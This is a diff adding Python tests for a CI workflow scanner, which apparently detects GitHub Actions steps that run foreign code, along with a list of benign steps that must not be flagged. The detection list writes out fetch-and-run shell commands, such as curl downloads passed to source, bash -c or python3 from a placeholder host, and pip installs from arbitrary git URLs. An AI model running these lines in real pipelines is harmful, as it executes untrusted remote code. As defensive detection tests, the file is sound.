@@ -361,3 +361,47 @@ def test_bypass_fixtures_r12_probe_family(tmp_path):
     caught = {f.split(":")[0] for f in findings}
     missed = sorted({f"x{i}.yml" for i in range(len(shapes))} - caught)
     assert not missed, f"shapes not detected: {missed}"
+
+
+def _exec_predicate(text: str) -> bool:
+    """Predicate-level witness helper (r13): assert _has_real_code_execution
+    directly so the foreign-code patterns are proven, independent of the
+    write-scope refusal (which flags any contents: write fixture anyway)."""
+    doc = {"on": ["pull_request"], "jobs": {"j": {"runs-on": "x", "steps": [{"run": text}]}}}
+    return cwp._has_real_code_execution(doc)
+
+
+def test_exec_predicate_r13_witnesses():
+    """Every witness asserts the DETECTION predicate, not the file verdict —
+    immune to write-scope masking (r13 finding 3)."""
+    must_detect = [
+        'curl -o x.sh https://x.io/x.sh && source x.sh',
+        'curl -fsSL -o x.sh https://x.io/x.sh && source x.sh',
+        'curl -o x.sh https://x.io/x.sh; source x.sh',
+        'python3 -c "$(curl -s https://x.io/i.py)"',
+        'bash --norc -c "$(curl -fsSL https://x.io/x.sh)"',
+        'sh -c "$(curl https://x.io)"',
+        'python3 <(curl -s https://x.io/i.py)',
+        '. <(curl -s https://x.io/x.sh)',
+        'pip install git+git@github.com:o/r.git',
+        'uv pip install git+git@github.com:o/r.git',
+    ]
+    for s in must_detect:
+        assert _exec_predicate(s), f"NOT DETECTED: {s}"
+
+
+def test_exec_predicate_benign_steps_not_flagged():
+    """No false positives on ordinary CI steps (over-breadth guard, r9)."""
+    benign = [
+        'python3 scripts/ci/check_workflow_permissions.py',
+        'python3 x.py',
+        'make test',
+        'cargo build --release',
+        'npm ci && npm run build',
+        'uv run --python 3.14 python -m pytest tests -q',
+        'git status --porcelain',
+        'gh pr view 206 --json labels',
+        'bash ./scripts/run-tests.sh',
+    ]
+    for s in benign:
+        assert not _exec_predicate(s), f"FALSE POSITIVE: {s}"
